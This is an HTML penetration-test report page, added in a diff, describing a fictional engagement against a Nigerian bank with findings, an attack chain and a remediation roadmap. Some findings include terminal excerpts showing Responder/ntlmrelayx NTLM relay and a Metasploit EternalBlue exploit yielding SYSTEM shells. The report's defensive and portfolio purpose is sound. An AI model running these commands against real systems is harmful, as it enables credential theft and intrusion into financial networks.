+            <div><div class="cl">Remediation</div><div class="cv">Enable Kerberos pre-authentication on all accounts · Enforce strong password policy · Audit accounts with DONT_REQUIRE_PREAUTH flag · Implement PAM solution</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-net">Network</span>
+          <span class="ft">NTLM relay via LLMNR/NBT-NS poisoning — domain credentials intercepted</span>
+          <span class="cvss-score">CVSS 7.8</span>
+        </div>
+        <div class="fb">
+          <p>LLMNR and NBT-NS protocols were active on the internal banking network. Using Responder, the tester poisoned name resolution requests and captured NTLMv2 hashes from multiple workstations. Combined with disabled SMB signing on several hosts, these hashes were relayed via ntlmrelayx to authenticate to internal file servers — gaining access without cracking the captured hash.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">$</span> <span class="tc">responder -I eth0 -wrf</span></span>
+            <span class="tl"><span class="ts">[+] NTLMv2 hash captured: UTBANK\teller_workstation01</span></span>
+            <span class="tl">&nbsp;</span>
+            <span class="tl"><span class="tp">$</span> <span class="tc">ntlmrelayx.py -tf smb-targets.txt -smb2support</span></span>
+            <span class="tl"><span class="ts">[+] Relayed to 192.168.10.45 — access granted to \\FILESERVER\CustomerReports</span></span>
+            <span class="tl"><span class="tw">[!] Customer transaction exports accessible — no credential cracking required</span></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-high">High</span>
+          <span class="cat-badge cat-net">Network</span>
+          <span class="ft">EternalBlue (MS17-010) — unpatched Windows 7 workstations on banking LAN</span>
+          <span class="cvss-score">CVSS 8.1</span>
+        </div>
+        <div class="fb">
+          <p>Network scanning identified three Windows 7 workstations running unpatched SMB v1 on the internal banking LAN. These hosts were confirmed vulnerable to MS17-010 (EternalBlue) — the same exploit used in the WannaCry ransomware campaign. Exploitation via Metasploit yielded SYSTEM-level shells on all three hosts, which were teller workstations with direct access to the core banking application.</p>
+          <div class="term">
+            <span class="tl"><span class="tp">msf6</span> <span class="tc">use exploit/windows/smb/ms17_010_eternalblue</span></span>
+            <span class="tl"><span class="tk">set RHOSTS</span> <span class="tv">192.168.10.21</span></span>
+            <span class="tl"><span class="tp">msf6</span> <span class="tc">run</span></span>
+            <span class="tl"><span class="ts">[+] 192.168.10.21:445 — exploit completed successfully</span></span>
+            <span class="tl"><span class="ts">[+] Meterpreter session opened — SYSTEM on TELLER-WS-021</span></span>
+            <span class="tl"><span class="tw">[!] Teller workstation compromised — core banking app session accessible</span></span>
+          </div>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Core banking application access · Fraudulent transaction initiation · Ransomware deployment risk · Full teller session hijack</div></div>
+            <div><div class="cl">Remediation</div><div class="cv">Patch MS17-010 immediately (KB4012212) · Disable SMBv1 · Upgrade all Windows 7 hosts · Segment teller network from general LAN</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="fh">
+          <span class="sev s-med">Medium</span>
+          <span class="cat-badge cat-net">Network</span>
+          <span class="ft">Weak network segmentation — teller LAN reachable from guest WiFi</span>
+          <span class="cvss-score">CVSS 6.5</span>
+        </div>
+        <div class="fb">
+          <p>The bank's guest WiFi network was found to have insufficient segmentation from the internal teller and operations LAN. From a device connected to the guest network, the tester was able to reach internal IP ranges including teller workstations and the core banking API server — without any authenticated VPN or additional access controls in place.</p>
+          <div class="two-col">
+            <div><div class="cl">Impact</div><div class="cv">Physical attacker (customer in branch) can reach internal banking systems from guest WiFi · Pivot point for further internal attacks</div></div>
+            <div><div class="cl">Remediation</div><div class="cv">Implement strict VLAN segmentation · Deploy stateful firewall rules between guest and teller networks · Enable 802.1X on all internal network ports</div></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ATTACK CHAIN -->
+  <section>
+    <h2>Primary attack chain — external attacker to financial fraud</h2>
+    <div class="chain">
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(255,79,79,.12);color:var(--red)">01</div><div class="cline"></div></div>
+        <div class="cc"><h4>Subdomain enumeration & takeover</h4><p>Subfinder identifies dangling CNAME on onlinebanking.[REDACTED].ng pointing to deprovisioned Azure resource. Tester claims the unclaimed cloud instance and deploys pixel-perfect phishing portal on bank's own verified domain.</p></div>
+      </div>
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(255,140,66,.12);color:var(--orange)">02</div><div class="cline"></div></div>
+        <div class="cc"><h4>Credential harvesting campaign</h4><p>Phishing emails sent to bank customers directing them to the legitimate-looking subdomain. SSL certificate auto-issued by Let's Encrypt — padlock visible. Customer credentials submitted and captured in real time. Zero browser warnings triggered.</p></div>
+      </div>
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(255,140,66,.1);color:var(--orange)">03</div><div class="cline"></div></div>
+        <div class="cc"><h4>SQL injection — database access</h4><p>Error-based SQLi on the real login portal yields full customer database. BVN, account numbers, hashed passwords, and transaction history exfiltrated. Admin authentication bypassed using classic payload.</p></div>
+      </div>
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(240,180,41,.1);color:var(--amber)">04</div><div class="cline"></div></div>
+        <div class="cc"><h4>Unauthenticated transfer API exploitation</h4><p>Unauthenticated /api/v1/transfer endpoint discovered. Fund transfers initiated without any session token, OTP, or PIN requirement. Test transfers processed successfully — direct path to financial fraud confirmed.</p></div>
+      </div>
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(240,180,41,.1);color:var(--amber)">05</div><div class="cline"></div></div>
+        <div class="cc"><h4>Internal pivot — LLMNR poisoning + EternalBlue</h4><p>From compromised credentials, internal access obtained. LLMNR poisoning captures NTLMv2 hashes. EternalBlue exploits unpatched Windows 7 teller workstations — SYSTEM shell on core banking terminal.</p></div>
+      </div>
+      <div class="cs">
+        <div class="cl2"><div class="cn" style="background:rgba(52,211,153,.1);color:var(--green)">06</div></div>
+        <div class="cc"><h4>AS-REP Roasting → domain credential access</h4><p>Four accounts with pre-auth disabled yield crackable hashes. Credentials to svc_reporting and it_admin_backup recovered. File server access exposes bulk customer transaction exports. Full domain escalation path identified.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- COMPLIANCE -->
+  <section>
+    <h2>Regulatory & compliance impact</h2>
+    <p>The findings from this engagement have direct implications across multiple Nigerian and international regulatory frameworks applicable to commercial banking. The subdomain takeover and SQL injection findings alone trigger mandatory breach notification obligations.</p>
+    <div class="compliance-row">
+      <div class="comp-item"><div class="comp-name">CBN Cybersecurity Framework</div><div class="comp-body">Sections 3.1, 3.4, 4.2 — Critical infrastructure protection & incident response</div></div>
+      <div class="comp-item"><div class="comp-name">NDPR 2019</div><div class="comp-body">Data breach notification obligation · Data minimisation violations · BVN exposure</div></div>
+      <div class="comp-item"><div class="comp-name">PCI-DSS v4.0</div><div class="comp-body">Req. 6.4, 8.3, 11.3 — Web app security, MFA, penetration testing</div></div>
+      <div class="comp-item"><div class="comp-name">ISO/IEC 27001:2022</div><div class="comp-body">Annex A — A.8.8 Vulnerability mgmt · A.8.20 Network security · A.5.24 IR planning</div></div>
+      <div class="comp-item"><div class="comp-name">OWASP Top 10 2021</div><div class="comp-body">A01 Broken Access Control · A03 Injection · A05 Security Misconfiguration · A07 Auth failures</div></div>
+    </div>
+  </section>
+
+  <!-- REMEDIATION -->
+  <section>
+    <h2>Prioritised remediation roadmap</h2>
+    <h3 style="font-size:14px;color:var(--red);margin-bottom:10px;">Critical — within 24 hours</h3>
+    <ul class="rl">
+      <li>Remove dangling CNAME record for onlinebanking subdomain immediately — take down attacker-claimable DNS entry</li>
+      <li>Take the unauthenticated /api/v1/transfer endpoint offline until authentication and OTP enforcement are implemented</li>
+      <li>Patch the SQL injection vulnerability on the login endpoint — implement parameterised queries and WAF rules</li>
+      <li>Apply MS17-010 patch (KB4012212) to all Windows 7 hosts — disable SMBv1 across the entire network</li>
+    </ul>
+    <h3 style="font-size:14px;color:var(--orange);margin-top:20px;margin-bottom:10px;">High — within 1 week</h3>
+    <ul class="rl">
+      <li>Conduct full subdomain audit — enumerate all CNAMEs and verify every target cloud resource is actively claimed</li>
+      <li>Implement rate limiting, exponential backoff, and account lockout on all PIN and OTP verification endpoints</li>
+      <li>Enable Kerberos pre-authentication on all domain accounts — audit DONT_REQUIRE_PREAUTH flag across AD</li>
+      <li>Disable LLMNR and NBT-NS across all internal network segments — enforce SMB signing via Group Policy</li>
+      <li>Fix stored XSS in customer feedback module — implement output encoding and Content-Security-Policy</li>
+    </ul>
+    <h3 style="font-size:14px;color:var(--amber);margin-top:20px;margin-bottom:10px;">Medium — within 30 days</h3>
+    <ul class="rl">
+      <li>Implement server-side ownership validation on all account-referencing API endpoints to remediate IDOR</li>
+      <li>Apply data minimisation to all API responses — return only fields required for the specific operation</li>
+      <li>Deploy all missing HTTP security headers — CSP, HSTS, X-Frame-Options, X-Content-Type-Options</li>
+      <li>Implement strict network segmentation — isolate teller VLAN from guest WiFi and general corporate network</li>
+      <li>Deploy DNS monitoring and CAA records across all subdomains to prevent future takeover opportunities</li>
+    </ul>
+
+    <div class="outcome">
+      <h3>Engagement outcome</h3>
+      <p>All 31 findings were documented with CVSS v3.1 scores, proof-of-concept evidence, OWASP and CBN regulatory mapping, and prioritised remediation roadmaps. Delivered in executive summary format for board and risk committee, and full technical format for the security and development teams.</p>
+      <p style="margin-top:8px;font-size:13px;color:#8b99a8;">The subdomain takeover finding was disclosed responsibly and the DNS record was removed within 2 hours of the critical finding notification. No real customer data was accessed or retained during the engagement.</p>
+      <p style="margin-top:10px;font-family:var(--mono);font-size:11px;color:var(--green);">→ Retesting scoped and scheduled · Authorised engagement · NDA in effect · No production systems harmed</p>
+    </div>
+  </section>
+
+  <footer>
+    <div class="fn"><strong>Oluwatobi Aladetuyi</strong> — Penetration Tester · VAPT Consultant<br><span style="font-size:12px">PSE Ltd · Lagos, Nigeria · tobialadetuyi@gmail.com</span></div>
+    <span class="redacted">[ FICTIONAL ENGAGEMENT ] Unity Trust Bank · For portfolio purposes only</span>
+  </footer>
+
+</div>
+</body>
+</html>
